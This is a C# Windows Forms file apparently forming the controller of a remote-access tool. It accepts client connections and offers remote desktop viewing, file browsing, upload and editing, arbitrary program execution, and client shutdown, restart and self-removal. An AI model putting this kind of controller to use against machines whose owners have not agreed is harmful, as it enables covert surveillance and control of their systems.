using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Linq;
namespace Server
{
    public partial class MainForm : Form
    {

        public MainForm()
        {
            InitializeComponent();
        }
        public void Addlog(string log, Color clr)
        {
            txtlog.Invoke(new MethodInvoker(
                        delegate
                        {
                            txtlog.SelectionColor = clr;
                            txtlog.AppendText(DateTime.Now.ToString() + ": " + log + Environment.NewLine);
                            txtlog.ScrollToCaret();
                        }
                        ));
        }
        class ClientNode
        {
            public Socket socket { get; set; }
            public string ComputerName { get; set; }
            public string IP { get; set; }
            public string Username { get; set; }
        }
        private List<ClientNode> ClientList = new List<ClientNode>();
        Forms.RemoteDesktop remote_form = new Forms.RemoteDesktop();
        Forms.FileManager file_manager = new Forms.FileManager();
        Socket ServerSoc;
        bool Server_Closed = true;
        public void StartServer()
        {
            string ip = "";
            string port = "";
            txtip.Invoke(new MethodInvoker(
                       delegate
                       {
                           ip = txtip.Text;
                           port = txtport.Text;
                       }
                       ));

            this.Invoke((MethodInvoker)delegate
            {
                ServerSoc = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                ServerSoc.Bind(new IPEndPoint(IPAddress.Parse(ip), int.Parse(port)));
                ServerSoc.Listen(1);
                statuslabel.Text = "Server started.";
                Addlog("Server started.", Color.Black);
            });
            while (true)
            {
                Socket ClientSoc = null;
                try
                {
                    ClientSoc = ServerSoc.Accept();
                }
                catch
                {
                    //Addlog("Accept client aborted.", Color.Black);
                    return;
                }
                IPEndPoint cip = ClientSoc.RemoteEndPoint as IPEndPoint;
                ClientNode n = new ClientNode();
                n.socket = ClientSoc;
                n.IP = cip.Address.ToString();
                n.ComputerName = "";
                n.Username = "";
                ClientList.Add(n);
                UpdateClientList();
                Addlog("Client " + n.IP + " detected.", Color.Black);
                //get client informatin
                Classes.Commands.GetSystemInformation(ClientSoc);
                Thread TR_server = new Thread(delegate(object unused) { GetData(n); });
                TR_server.IsBackground = true;
                TR_server.Start();
            }

        }
        private bool IsConnected(Socket socket)
        {
            try
            {
                return !(socket.Poll(1, SelectMode.SelectRead) && socket.Available == 0);
            }
            catch (SocketException) { return false; }
        }
        private void UpdateClientList()
        {
            ClientList_view.Invoke(new MethodInvoker(
                       delegate
                       {
                           ClientList_view.Items.Clear();
                           ClientList_view.BeginUpdate();
                           foreach (ClientNode c in ClientList)
                           {
                               if (!IsConnected(c.socket))
                               {
                                   ClientList.Remove(c);
                                   if (ClientList.Count == 0)
                                   {
                                       ClientList_view.EndUpdate();
                                       return;
                                   }
                                   else
                                   {
                                       continue;
                                   }
                               }
                               ListViewItem i = new ListViewItem();
                               IPEndPoint ip = c.socket.RemoteEndPoint as IPEndPoint;
                               i.Text = ip.Address.ToString();
                               i.SubItems.Add(c.ComputerName);
                               i.SubItems.Add(c.Username);
                               ClientList_view.Items.Add(i);
                           }
                           ClientList_view.EndUpdate();
                       }
                       ));
        }
        private void SetClientInformation(ClientNode n, string paramneters)
        {
            var t = ClientList.Where(c => c.IP == n.IP).SingleOrDefault();
            string[] p = paramneters.Split('<');
            t.ComputerName = p[0];
            t.Username = p[1];
            UpdateClientList();
        }
        private void ShowClientScreen(ClientNode n, byte[] parameters)
        {
            remote_form.SetScreen(parameters);
            if (remote_form.IsStart)
            {
                Thread.Sleep(1000);
                Classes.Commands.GetDesktopScreen(remote_form.Client, remote_form.width, remote_form.height, remote_form.type);
            }
        }
        private void GetData(ClientNode client)
        {
            while (true)
            {
                try
                {
                    byte[] b = new byte[10 * 1024 * 1024];
                    int r = client.socket.Receive(b);
                    if (r > 0)
                    {
                        string c = Encoding.Unicode.GetString(b);
                        int cmd_len = int.Parse(Encoding.Unicode.GetString(b, 0, 16));
                        string cmd = Encoding.Unicode.GetString(b, 16, cmd_len);
                        string[] cmd2 = cmd.Split('|');
                        string commandName = cmd2[0];
                        string commandParameters = cmd2[1];
                        //Addlog(cmd, Color.Black);
                        switch (commandName)
                        {
                            case "system.information": SetClientInformation(client, commandParameters);
                                break;
                            case "system.screen":
                                byte[] img = new byte[r - 16 - cmd_len];
                                Array.Copy(b, 16 + cmd_len, img, 0, r - 16 - cmd_len);
                                ShowClientScreen(client, img);
                                break;
                            case "io.drive":
                                file_manager.loadRemoteDrives_EXE(commandParameters);
                                break;
                            case "io.entries":
                                string[] rrr = commandParameters.Split('\n');
                                //MessageBox.Show(cmd.Length.ToString());
                                file_manager.loadRemoteEntries(commandParameters);
                                break;
                            case "uploadfile":
                                byte[] ddd = new byte[r - 16 - cmd_len];
                                Array.Copy(b, 16 + cmd_len, ddd, 0, r - 16 - cmd_len);
                                Classes.Commands.SaveFile(commandParameters, ddd);
                                break;
                            case "editfile":
                                //byte[] dddd = new byte[r - 16 - cmd_len];
                                //string filecontent = Encoding.Unicode.GetString(dddd);
                                //MessageBox.Show(filecontent);
                                string[] ttt = commandParameters.Split('<');
                                Forms.EditFile ef = new Forms.EditFile(ttt[1]);
                                ef.Client = client.socket;
                                ef.TargetFile = ttt[0];
                                ef.ShowDialog();
                                break;
                        }
                    }
                }
                catch
                {

                }
            }
        }

        private void MainForm_Load(object sender, EventArgs e)
        {

        }

        private void btnstart_Click(object sender, EventArgs e)
        {
            Thread TR_server = new Thread(delegate(object unused) { StartServer(); });
            TR_server.IsBackground = true;
            TR_server.Start();
            btnstart.Enabled = false;
            btnetop.Enabled = true;
            txtip.Enabled = false;
            txtport.Enabled = false;
            Server_Closed = false;
        }

        private void btnetop_Click(object sender, EventArgs e)
        {
            try
            {
                Server_Closed = true;
                if (ServerSoc != null) ServerSoc.Close();
                //ServerSoc = null;
                btnstart.Enabled = true;
                txtip.Enabled = true;
                txtport.Enabled = true;
                btnetop.Enabled = false;
                ClientList.Clear();
                UpdateClientList();
                statuslabel.Text = "Server stoped.";
                Addlog("Server stoped..", Color.Black);

            }
            catch
            {
                statuslabel.Text = "Error stopping server.";
                Addlog("Error stopping server.", Color.Black);
            }

        }

        private void MainForm_FormClosed(object sender, FormClosedEventArgs e)
        {
            try
            {
                if (ServerSoc != null) ServerSoc.Close();
                Environment.Exit(Environment.ExitCode);
            }
            catch
            {

            }
        }

        private void clientInformationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ClientList_view.SelectedItems.Count == 0) return;
            string ip = ClientList_view.SelectedItems[0].Text;
            var client = ClientList.Where(c => c.IP == ip).SingleOrDefault();
            Thread TR_server = new Thread(delegate(object unused) { Classes.Commands.GetSystemInformation(client.socket); });
            TR_server.IsBackground = true;
            TR_server.Start();
        }

        private void sendMessageToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ClientList_view.SelectedItems.Count == 0) return;
            string ip = ClientList_view.SelectedItems[0].Text;
            var client = ClientList.Where(c => c.IP == ip).SingleOrDefault();
            Forms.InputBox i = new Forms.InputBox("Enter message:");
            if (i.ShowDialog() == DialogResult.OK)
            {
                string message = i.Value;
                Thread TR_server = new Thread(delegate(object unused) { Classes.Commands.SendMessage(client.socket, message, client.Username); });
                TR_server.IsBackground = true;
                TR_server.Start();
            }
        }

        private void runProgramCMDToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ClientList_view.SelectedItems.Count == 0) return;
            string ip = ClientList_view.SelectedItems[0].Text;
            var client = ClientList.Where(c => c.IP == ip).SingleOrDefault();
            Forms.RunProgram i = new Forms.RunProgram();
            if (i.ShowDialog() == DialogResult.OK)
            {
                string cmd = i.Value;
                Thread TR_server = new Thread(delegate(object unused) { Classes.Commands.RunProgram(client.socket, cmd); });
                TR_server.IsBackground = true;
                TR_server.Start();
            }
        }

        private void shutDownClientToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ClientList_view.SelectedItems.Count == 0) return;
            string ip = ClientList_view.SelectedItems[0].Text;
            var client = ClientList.Where(c => c.IP == ip).SingleOrDefault();
            if (MessageBox.Show("Do you sure?", "Shutdown client", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                Thread TR_server = new Thread(delegate(object unused) { Classes.Commands.ExitClient(client.socket); });
                TR_server.IsBackground = true;
                TR_server.Start();
            }
        }

        private void removeClientToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ClientList_view.SelectedItems.Count == 0) return;
            string ip = ClientList_view.SelectedItems[0].Text;
            var client = ClientList.Where(c => c.IP == ip).SingleOrDefault();
            if (MessageBox.Show("Do you sure?", "Remove client", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                Thread TR_server = new Thread(delegate(object unused) { Classes.Commands.ExitClientAndDelete(client.socket); });
                TR_server.IsBackground = true;
                TR_server.Start();
            }
        }

        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ClientList_view.SelectedItems.Count == 0) return;
            string ip = ClientList_view.SelectedItems[0].Text;
            var client = ClientList.Where(c => c.IP == ip).SingleOrDefault();
            if (MessageBox.Show("Do you sure?", "Restart client", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                Thread TR_server = new Thread(delegate(object unused) { Classes.Commands.RestartClient(client.socket); });
                TR_server.IsBackground = true;
                TR_server.Start();
            }
        }

        private void shutDownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ClientList_view.SelectedItems.Count == 0) return;
            string ip = ClientList_view.SelectedItems[0].Text;
            var client = ClientList.Where(c => c.IP == ip).SingleOrDefault();
            if (MessageBox.Show("Do you sure?", "Shutdown client", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                Thread TR_server = new Thread(delegate(object unused) { Classes.Commands.ShutdownClient(client.socket); });
                TR_server.IsBackground = true;
                TR_server.Start();
            }
        }

        private void remoteDesktopToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (ClientList_view.SelectedItems.Count == 0) return;
            string ip = ClientList_view.SelectedItems[0].Text;
            var client = ClientList.Where(c => c.IP == ip).SingleOrDefault();
            remote_form.Client = client.socket;
            remote_form.SetTitle(ip);
            remote_form.ShowDialog();
        }

        private void fileManagerToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (ClientList_view.SelectedItems.Count == 0) return;
            string ip = ClientList_view.SelectedItems[0].Text;
            var client = ClientList.Where(c => c.IP == ip).SingleOrDefault();
            file_manager.Client = client.socket;
            file_manager.SetTitle(ip);
            file_manager.ShowDialog();
        }

        private void btnfilemanager_Click(object sender, EventArgs e)
        {
            fileManagerToolStripMenuItem1_Click(null, null);
        }

        private void btnremotedesktop_Click(object sender, EventArgs e)
        {
            remoteDesktopToolStripMenuItem1_Click(null, null);
        }

        private void btnrunprogram_Click(object sender, EventArgs e)
        {
            runProgramCMDToolStripMenuItem_Click(null, null);
        }

        private void btnsendmessage_Click(object sender, EventArgs e)
        {
            sendMessageToolStripMenuItem_Click(null, null);
        }

        private void timer_client_Tick(object sender, EventArgs e)
        {
            UpdateClientList();
        }
    }
}
